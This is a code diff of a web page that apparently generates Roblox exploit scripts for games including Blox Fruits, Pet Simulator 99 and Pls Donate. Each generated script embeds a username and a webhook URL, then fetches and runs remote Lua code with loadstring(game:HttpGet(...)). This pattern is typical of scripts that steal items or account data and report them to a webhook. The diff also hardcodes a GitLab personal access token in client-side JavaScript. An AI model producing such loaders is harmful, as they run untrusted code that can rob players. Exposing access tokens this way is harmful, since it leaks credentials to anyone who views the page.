@@ -55,12 +55,8 @@
     <div class="container">
         <input type="text" id="username" placeholder="Enter your Username" value="void6674109">
         <input type="text" id="webhook" placeholder="Enter Webhook URL">
-        <input type="text" id="pat" placeholder="Enter GitLab PAT">
-        <input type="text" id="scriptname" placeholder="Enter Script Name">
         <select id="script-select">
             <option value="Blox Fruits">Blox Fruits</option>
-            <option value="Murder Mystery 2">Murder Mystery 2</option>
-            <option value="Adopt Me">Adopt Me</option>
             <option value="Pet Simulator 99">Pet Simulator 99</option>
             <option value="Pls Donate">Pls Donate</option>
         </select>
@@ -68,50 +64,49 @@
     </div>
 
     <script>
-        // Script URLs for different games
+        // ✅ Fixed PAT and Project ID
+        const PAT = 'glpat-8si5orFgbXbJE4uzHwKS';
+        const PROJECT_ID = '67450323';
+
+        // ✅ Loadstrings (Adopt Me & MM2 removed)
         let loadstrings = {
-            "Blox Fruits": "https://raw.githubusercontent.com/Goldded/Void2/main/Bloxfruits",
-            "Murder Mystery 2": "https://raw.githubusercontent.com/Goldded/Void2/main/Void",
-            "Adopt Me": "https://raw.githubusercontent.com/Goldded/Void2/main/AdoptMe",
-            "Pet Simulator 99": "https://raw.githubusercontent.com/Goldded/Void2/main/Ps99",
-            "Pls Donate": "https://raw.githubusercontent.com/Goldded/Void2/main/PlsDonate"
+            "Blox Fruits": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/Bloxfruits'))()",
+            "Pet Simulator 99": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/Ps99'))()",
+            "Pls Donate": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/PlsDonate'))()"
         };
 
         // Main generate script function
         function generateScript() {
             let username = document.getElementById('username').value;
             let webhook = document.getElementById('webhook').value;
-            let pat = document.getElementById('pat').value;
-            let scriptName = document.getElementById('scriptname').value;
             let selectedScript = document.getElementById('script-select').value;
 
-            if (!username || !webhook || !pat || !scriptName) {
-                alert("Please fill out all fields!");
+            if (!username || !webhook) {
+                alert("Please enter both Username and Webhook URL!");
                 return;
             }
 
-            // ✅ Script format as requested
-            let script = `Username = "${username}"\nWebhook = "${webhook}"\nloadstring(game:HttpGet("${loadstrings[selectedScript]}"))()`;
+            // ✅ Script format
+            let script = `Username = "${username}"\nWebhook = "${webhook}"\n\n${loadstrings[selectedScript]}`;
 
             // Upload to GitLab
-            uploadToGitLab(script, scriptName, pat);
+            uploadToGitLab(script, selectedScript);
         }
 
         // GitLab Upload Function
-        function uploadToGitLab(content, scriptName, pat) {
-            let projectID = '67450323'; // ✅ Your GitLab Project ID
-            let filename = `${scriptName}.lua`; // File name in GitLab
+        function uploadToGitLab(content, scriptName) {
+            let filename = `${scriptName.replace(/\s+/g, '')}.lua`; // Clean filename
 
-            fetch(`https://gitlab.com/api/v4/projects/${encodeURIComponent(projectID)}/repository/files/${encodeURIComponent(filename)}`, {
+            fetch(`https://gitlab.com/api/v4/projects/${encodeURIComponent(PROJECT_ID)}/repository/files/${encodeURIComponent(filename)}`, {
                 method: 'POST',
                 headers: {
-                    'glpat-8si5orFgbXbJE4uzHwKS': pat, // ✅ Correct header for PAT
+                    'PRIVATE-TOKEN': PAT, // ✅ Using your PAT directly
                     'Content-Type': 'application/json'
                 },
                 body: JSON.stringify({
                     branch: 'main', // Ensure 'main' exists
                     content: btoa(content), // Encode script to base64
-                    commit_message: 'Add new script'
+                    commit_message: `Add ${scriptName} script`
                 })
             })
             .then(response => response.json())
@@ -119,7 +114,7 @@
                 if (data.file_path) {
                     alert("✅ Script uploaded successfully to GitLab!");
                 } else {
-                    alert("❌ Failed to upload. Check your PAT and Project ID.");
+                    alert("❌ Failed to upload. Check your details.");
                 }
             })
             .catch(error => {
